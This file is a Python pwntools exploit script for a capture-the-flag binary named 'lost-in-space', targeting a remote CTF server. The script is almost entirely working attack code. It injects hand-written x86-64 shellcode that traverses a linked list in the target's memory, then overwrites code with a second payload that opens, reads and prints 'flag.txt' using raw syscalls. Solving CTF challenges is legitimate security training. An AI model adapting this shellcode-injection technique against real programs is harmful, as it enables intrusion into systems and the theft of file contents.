from pwn import *

# Set up pwntools for the correct architecture
exe = "./lost-in-space"
# libc = ELF("")
context.binary = elf = ELF(exe)
# context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("lost-in-space.ctf.maplebacon.org", 1337 )
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* 0x1b065
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

r = start()

anotherone = asm("""
    xor rax, rax
    push rax
    mov rdi, 0x7478742e67616c66
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx

    mov al, 2
    syscall

    mov rdi, rax
    xor rax, rax
    mov rsi, rsp
    mov dx, 0x100
    syscall

    mov dil, 1
    mov rsi, rsp
    mov al, 1
    syscall

""")

shellcode = asm(f"""
    mov r10, rdx
    sub r10, 0x7f8

    /*rcx holds the first node of the linkedlist.*/
    mov rcx, r10
    sub rcx, 8

    /*stack - rsp=+0x40, no need base pointer :D */
    mov rsp, r10
    add rsp, 0x40
    jmp main
    
add:/*r12 is the argument to push*/
    mov r10, rsp
    mov r11, 1
a1: 
    cmp qword ptr [rsp+8*r11], 0
    je af
    inc r11
    jmp a1
af:
    mov [rsp+8*r11], r12
    ret

check:/*r12 is arg*/
    xor rax, rax
    mov r10, rsp
    add r10, 8
    xor r11, r11
    mov rax, 0
c1: 
    cmp [r10+8*r11], r12
    je cf
    cmp qword ptr [r10+8*r11], 0
    je cw
    inc r11
    jmp c1
cw: 
    ret
cf: 
    inc rax
    ret

main:/*always rcx is the node pointer*/ 
    cmp byte ptr [rcx], 1
    je win
    mov r13, 1
m3: 
    mov r12, [rcx+8*r13]
    call check
    cmp rax, 1
    jne m1
    inc r13
    jmp m3

m1: 
    call add
    mov rcx, r12
    jmp main

win:
    mov rax, 0x{anotherone[48:56][::-1].hex()}
    push rax
    mov rax, 0x{anotherone[40:48][::-1].hex()}
    push rax
    mov rax, 0x{anotherone[32:40][::-1].hex()}
    push rax
    mov rax, 0x{anotherone[24:32][::-1].hex()}
    push rax
    mov rax, 0x{anotherone[16:24][::-1].hex()}
    push rax
    mov rax, 0x{anotherone[8:16][::-1].hex()}
    push rax
    mov rax, 0x{anotherone[0:8][::-1].hex()}
    push rax
    mov r10, 0
bomb:
    pop rax
    mov [rcx+r10*8], rax
    inc r10
    cmp r10, 12
    jle bomb
    call rcx

""")
print(len(shellcode))
sl(shellcode)

r.interactive()
